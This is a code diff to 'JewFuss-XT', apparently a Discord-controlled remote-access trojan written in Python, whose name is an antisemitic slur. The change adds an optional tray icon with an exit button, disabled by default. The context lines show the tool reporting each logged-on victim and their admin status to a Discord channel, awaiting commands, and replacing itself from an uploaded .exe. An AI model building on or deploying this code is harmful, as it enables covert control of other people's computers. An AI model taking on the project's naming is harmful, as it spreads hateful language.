@@ -20,6 +20,7 @@ import pymsgbox
 import requests
 import asyncio
 import discord
+import pystray
 import getpass
 import sqlite3
 import tarfile
@@ -45,7 +46,8 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.14" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.15" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False
 
 intents = discord.Intents.all()
 
@@ -69,6 +71,28 @@ async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "
 
 commands.Context.fm_send = fm_send
 commands.Context.fm_reply = fm_reply
+
+TRAY_TITLE = os.path.basename(sys.argv[0].split('.')[0])
+TRAY_TOOLTIP = f"{TRAY_TITLE} {version}"
+
+tray_icon = None
+
+if USE_TRAY_ICON:
+    tray_image = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
+    draw = ImageDraw.Draw(tray_image)
+    draw.rounded_rectangle((8, 10, 56, 42), radius=6, fill=(20, 20, 20, 255))
+    draw.rectangle((26, 44, 38, 50), fill=(20, 20, 20, 255))
+    draw.line((16, 20, 46, 20), fill=(0, 200, 0, 255), width=2)
+    draw.line((16, 28, 40, 28), fill=(0, 200, 0, 255), width=2)
+    draw.line((16, 36, 34, 36), fill=(0, 200, 0, 255), width=2)
+    draw.ellipse((46, 26, 54, 34), fill=(0, 200, 0, 255))
+    draw.line((40, 30, 46, 30), fill=(0, 200, 0, 255), width=2)
+
+def tray_on_exit_clicked(icon, item):
+    asyncio.run_coroutine_threadsafe(bot.close(), bot.loop)
+    icon.visible = False
+    icon.stop()
+    os._exit(0)
 
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
 async def update(ctx):
@@ -824,6 +848,16 @@ async def on_ready():
             await existing_channel.edit(topic=logon_date)
             await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
         in_server_amount += 1
+        
+        if not USE_TRAY_ICON or tray_icon is not None:
+            return
+        print("Starting tray icon...")
+        
+        menu = pystray.Menu(pystray.MenuItem("Exit", tray_on_exit_clicked))
+        tray_icon = pystray.Icon("JewFuss-XT", tray_image, TRAY_TITLE, menu)
+        tray_icon.title = TRAY_TOOLTIP
+        tray_icon.run_detached()
+
 
     print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
     
